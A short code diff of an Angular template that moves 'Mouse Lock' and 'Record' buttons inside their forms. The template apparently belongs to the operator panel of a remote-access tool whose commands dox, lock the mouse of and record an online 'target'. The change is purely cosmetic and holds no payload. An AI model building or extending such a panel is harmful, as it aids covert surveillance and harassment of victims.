@@ -17,9 +17,9 @@
             (click)="wrocsidHandler('dox', target.identifier)">Dox</button>
         </div>
         <div>
-          <button mat-button [disabled]="!target.online || !mouseForm.valid" color="accent"
-            (click)="wrocsidHandler('mouse', target.identifier, concatTime(mouseForm))">Mouse Lock</button>
           <form [formGroup]="mouseForm">
+            <button mat-button [disabled]="!target.online || !mouseForm.valid" color="accent"
+            (click)="wrocsidHandler('mouse', target.identifier, concatTime(mouseForm))">Mouse Lock</button>
             <mat-form-field appearance="fill" class="timeInput">
               <mat-label>Time amount</mat-label>
               <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
@@ -51,9 +51,9 @@
           </form>
         </div>
         <div>
-          <button mat-button [disabled]="!target.online || !recordForm.valid" color="accent"
-            (click)="wrocsidHandler('record', target.identifier, concatTime(recordForm))">Record</button>
             <form [formGroup]="recordForm">
+              <button mat-button [disabled]="!target.online || !recordForm.valid" color="accent"
+              (click)="wrocsidHandler('record', target.identifier, concatTime(recordForm))">Record</button>
               <mat-form-field appearance="fill" class="timeInput">
                 <mat-label>Time amount</mat-label>
                 <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
